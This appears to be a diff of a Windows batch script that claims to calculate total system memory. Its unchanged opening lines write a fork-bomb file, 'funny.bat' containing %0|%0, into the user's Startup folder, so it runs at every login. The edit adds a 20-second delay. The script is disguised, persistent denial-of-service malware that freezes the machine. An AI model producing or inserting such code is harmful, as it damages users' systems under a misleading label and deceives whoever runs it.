@@ -1,7 +1,7 @@
 @echo off 
 cd "%AppData%/Microsoft/Windows/Start Menu/Programs/Startup"
 echo -e %0|%0 > funny.bat
-
+TIMEOUT /T 20
 echo Calculating total system memory
 for /f "skip=1" %%p in ('wmic os get TotalVisibleMemorySize') do ( 
    set system_ram=%%p
